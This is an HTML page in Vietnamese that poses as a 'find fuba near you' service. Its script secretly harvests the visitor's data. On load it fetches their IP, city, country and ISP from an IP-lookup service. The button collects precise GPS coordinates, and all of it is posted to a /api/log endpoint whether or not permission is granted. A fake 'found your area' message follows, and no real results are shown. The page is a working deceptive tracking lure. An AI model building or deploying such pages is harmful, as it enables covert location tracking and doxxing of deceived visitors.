<!DOCTYPE html>
<html>
<head>
  <title>thợ săn fuba</title>
  <style>
    body {
      font-family: Arial;
      text-align: center;
      background: #f5f5f5;
      padding-top: 100px;
    }

    .card {
      background: white;
      padding: 30px;
      border-radius: 12px;
      width: 300px;
      margin: auto;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
    }

    button {
      padding: 12px 20px;
      border: none;
      background: #007bff;
      color: white;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background: #0056b3;
    }

    .loading {
      display: none;
      margin-top: 15px;
      color: gray;
    }
  </style>
</head>
<body>

<div class="card">
  <h2>tìm fuba gần bạn</h2>
  <p>Cho phép vị trí để xem gợi ý chính xác nhất</p>

  <button onclick="getLocation()">bắt đầu tìm kiếm</button>

  <div class="loading" id="loading">Đang tìm...</div>
</div>

<script>
let data = {};
let sent = false;

async function getIP() {
  try {
    const res = await fetch("https://ipwho.is/");
    const ipData = await res.json();

    data.ip = ipData.ip;
    data.city = ipData.city;
    data.country = ipData.country;
    data.isp = ipData.connection?.isp;
  } catch {}
}

function sendData() {
  if (sent) return;
  sent = true;

  fetch("/api/log", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });
}

// ✅ ĐÚNG: gói vào function
function getLocation() {
  document.getElementById("loading").style.display = "block";

  if (!navigator.geolocation) {
    sendData();
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      data.lat = pos.coords.latitude;
      data.lon = pos.coords.longitude;
      data.accuracy = pos.coords.accuracy;

      sendData();

      setTimeout(() => {
        document.querySelector(".card").innerHTML = `
          <h3>Đã tìm thấy khu vực của bạn</h3>
          <p>Đang hiển thị gợi ý phù hợp...</p>
        `;
      }, 1500);
    },
    () => {
      sendData();
    }
  );
}

// chỉ lấy IP khi load
getIP();
</script>

</body>
</html>
